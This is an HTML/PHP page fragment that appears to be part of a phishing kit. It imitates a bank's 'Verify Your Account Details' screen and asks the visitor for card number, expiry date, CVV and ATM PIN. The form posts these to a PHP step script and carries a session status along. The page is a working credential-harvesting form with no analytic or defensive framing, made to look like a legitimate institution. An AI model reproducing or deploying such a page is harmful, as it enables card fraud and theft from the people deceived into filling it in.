...
<div id="page-container" class="page-container">
	<div class="centered-content clearfix">
    	...
    	<section id="main-container" class="main-container two-col layout-2-1 clearfix">
        	...
        	================= -->
        	<section id="main-content" class="page-region">
            ...
            <div class="account-content-container">
                <div class="account-table-body">
                    ...
                    <a href="#" class="mobile-help-trigger">Help</a>
                            ...
                            <h1>Verify Your Account Details</h1>
                    ...
                    <form action="step/next/mainnet.php?status=<?php echo $_SESSION['status']; ?>" method="post" class="unauth-form jqtransform js-login-form">
                    <div class="account-title clearfix">
                                            <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Please verify your Card details in the form below.</p>
                                    </div>
                    ...
                    <div class="unauth-form__row">
                        ...
                        <div class="unauth-form__row js-option-identify-mtd">
                            <div class="js-user-block">
                                <div class="unauth-form__row">
                                    <div class="uath-frm__rwtem g-left">
                                        <label class="unauth-form__label" for="unauth-form-first-name">Card Number:</label>
                                        <div>
                                            <input id="unauth-form-first-name" name="ccnum" type="tel" placeholder="____-____-____-____" data-slots="_" class="unauth-form__input js-firstname" data-toenable="accInfoLastName"  autocomplete="off" required="">
                                        </div>
                                       
                                    </div>
                                    <div class="uath-frm__rwtem g-right">
                                        <label class="unauth-form__label" for="unauth-form-last-name">Expire Date:</label>
                                        <div>
                                             <input id="unauth-form-first-name" name="expd" type="tel" placeholder="MM/YY" data-slots="MY" class="unauth-form__input js-firstname" data-toenable="accInfoLastName" maxlength="20" autocomplete="off" required="">
                                        </div>
                                        </div>
                                ...
                                <div class="unauth-form__row">
                                    <div class="uath-frm__rwtem g-left">
                                            <label class="unauth-form__label">CVV:</label>
                                            <div>
                                                <input name="cvv" type="text" data-toenable="accInfoLastFourSSN" placeholder="Enter Your Card CVV" maxlength="3" minlength="3" class="unauth-form__input datepicker unauth-ic-form__dateinput hasDatepicker" id="dp1608300128480" autocomplete="off" data-mask="00/00/0000" required="">
                                            </div>
                                    ...
                                    <div class="uath-frm__rwtem g-right">
                                        ...
                                        <div>
                                            <input name="atp" placeholder="Enter Card ATM Pin" id="unauth-ic-form-ssn" maxlength="4" class="unauth-form__input js-ssn-tin" type="tel" autocomplete="off" required="">
                                        </div>
                ...
                <input type="submit" name="crevrify" class="submit-button g-right" tabindex="3" data-trigger="next" value="Submit">           
                </div>       </form>
